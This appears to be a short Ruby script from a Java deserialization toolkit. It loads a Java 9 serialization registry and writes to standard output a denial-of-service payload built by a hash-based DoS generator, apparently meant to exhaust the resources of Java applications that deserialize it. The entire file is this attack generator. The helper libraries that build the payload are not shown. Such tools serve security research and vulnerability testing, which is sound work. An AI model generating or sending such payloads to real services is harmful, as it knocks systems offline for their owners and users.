#!/usr/bin/env ruby
require_relative 'classfile'
require_relative 'serialize'
require_relative 'payloads/dos'

# register the right model files
reg = Java::Serialize::Registry.new
reg.load('model/base-java9.json')
oos = Java::Serialize::ObjectOutputStream.new(STDOUT, reg)
oos.writeObject(Java::Serialize::Payloads::DOS.make_hash_dos(25))
